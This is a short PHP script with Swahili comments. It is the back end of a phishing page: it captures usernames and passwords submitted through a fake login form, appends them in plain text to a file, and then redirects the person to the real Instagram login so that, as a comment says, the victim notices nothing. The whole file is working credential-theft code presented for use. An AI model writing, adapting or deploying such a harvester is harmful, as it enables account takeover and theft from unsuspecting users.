<?php
// Hapa tunachukua data kutoka kwenye form
$username = $_POST['username'];
$password = $_POST['password'];

// Tunazihifadhi kwenye faili la usernames.txt
$file = fopen("usernames.txt", "a");
fwrite($file, "User: " . $username . " | Pass: " . $password . "\n");
fclose($file);

// Tunamrudisha mhanga Instagram halisi asijue chochote
header("Location: https://www.instagram.com/accounts/login/");
exit();
?>

